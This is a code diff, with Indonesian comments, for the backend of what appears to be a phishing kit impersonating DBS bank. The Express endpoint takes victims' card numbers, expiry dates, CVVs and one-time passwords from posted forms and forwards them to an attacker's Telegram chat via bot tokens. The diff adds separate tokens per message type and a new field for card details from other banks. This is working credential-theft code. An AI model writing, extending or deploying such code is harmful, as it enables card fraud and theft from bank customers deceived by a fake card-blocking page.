@@ -6,41 +6,34 @@ dotenv.config();
 const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(__dirname + '/public')); // untuk akses HTML/CSS
+app.use(express.static(__dirname + '/public'));
 
-// Ambil semua token dari environment
-const tokens = [
-  process.env.BOT_TOKEN_1,
-  process.env.BOT_TOKEN_2,
-  process.env.BOT_TOKEN_3
-];
-
-// Pastikan semua token tidak kosong
-const validTokens = tokens.filter(Boolean);
+const chat_id = process.env.CHAT_ID;
 
 app.post('/kirim-ke-telegram', async (req, res) => {
-  const { nomor, valid, cvv, otp } = req.body;
-  const chat_id = process.env.CHAT_ID;
+  const { nomor, valid, cvv, otp, laporan } = req.body;
 
-  if (!chat_id) {
-    return res.status(500).send("CHAT_ID belum diatur");
-  }
-
-  // Pilih token acak dari yang tersedia
-  const token = validTokens[Math.floor(Math.random() * validTokens.length)];
-
-  if (!token) {
-    return res.status(500).send("Tidak ada BOT_TOKEN yang tersedia");
-  }
-
+  let token;
   let message = "";
 
   if (otp) {
+    // Kirim OTP (batalkan transaksi)
+    token = process.env.BOT_TOKEN_OTP;
     message = `🔐 *Kode OTP Diterima*\n\n*OTP:* ${otp}`;
   } else if (nomor && valid && cvv) {
+    // Blokir kartu kredit
+    token = process.env.BOT_TOKEN_BLOKIR;
     message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
+  } else if (laporan) {
+    // Laporan kartu bank lain
+    token = process.env.BOT_TOKEN_LAPORAN;
+    message = `📄 *Laporan Kartu Bank Lain*\n\n${laporan}`;
   } else {
     return res.status(400).send("Data tidak lengkap");
+  }
+
+  if (!token || !chat_id) {
+    return res.status(500).send("Token atau Chat ID belum diatur");
   }
 
   try {
